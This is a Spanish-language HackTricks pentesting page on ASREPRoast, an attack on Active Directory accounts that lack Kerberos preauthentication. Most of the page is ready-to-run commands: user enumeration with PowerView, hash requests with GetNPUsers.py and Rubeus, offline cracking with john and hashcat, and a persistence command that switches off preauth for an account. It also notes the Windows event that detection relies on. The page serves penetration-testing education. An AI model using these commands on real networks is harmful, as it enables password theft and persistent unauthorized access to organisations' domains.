## ASREPRoast

El ataque ASREPRoast busca usuarios sin el atributo de requerimiento de preautenticación de Kerberos (_**DONT_REQ_PREAUTH**_).

Esto significa que cualquier persona puede enviar una solicitud AS_REQ al DC en nombre de cualquiera de esos usuarios y recibir un mensaje AS_REP. Este último tipo de mensaje contiene un fragmento de datos cifrado con la clave de usuario original, derivada de su contraseña. Luego, utilizando este mensaje, la contraseña del usuario podría ser descifrada sin conexión.

Además, **no se necesita una cuenta de dominio para realizar este ataque**, solo la conexión al DC. Sin embargo, **con una cuenta de dominio**, se puede utilizar una consulta LDAP para **recuperar usuarios sin preautenticación de Kerberos** en el dominio. **De lo contrario, los nombres de usuario deben ser adivinados**.

#### Enumeración de usuarios vulnerables (se necesitan credenciales de dominio)
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
#### Solicitar mensaje AS_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% code title="Usando Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
El robo de AS-REP con Rubeus generará un evento 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
{% endhint %}

### Descifrando
```
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt 
```
### Persistencia

Forzar que no se requiera **preauth** para un usuario en el que se tienen permisos de **GenericAll** (o permisos para escribir propiedades):
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
## Referencias

[**Más información sobre el robo de AS-RRP en ired.team**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

<figure><img src="../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

[**Sigue a HackenProof**](https://bit.ly/3xrrDrL) **para aprender más sobre errores web3**

🐞 Lee tutoriales sobre errores web3

🔔 Recibe notificaciones sobre nuevos programas de recompensas por errores

💬 Participa en discusiones de la comunidad

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
